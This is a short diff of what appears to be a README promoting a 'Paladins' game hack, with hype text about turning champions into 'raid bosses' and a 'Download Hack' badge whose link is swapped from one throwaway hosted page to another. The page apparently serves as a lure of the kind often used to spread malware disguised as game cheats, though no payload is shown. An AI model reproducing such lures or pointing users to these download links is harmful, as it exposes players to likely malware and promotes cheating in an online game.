@@ -6,7 +6,7 @@ If you're done being out-aimed, out-positioned, and outplayed in **Paladins**, i
 
 Whether you main Viktor, Skye, or Koga, this tool turns every champ into a literal raid boss. 💥👑
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://fileoffload6.bitbucket.io)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://Paladins-Hack-mecy4.github.io/.github)
 ---
 
 ## 🧰 Product Description
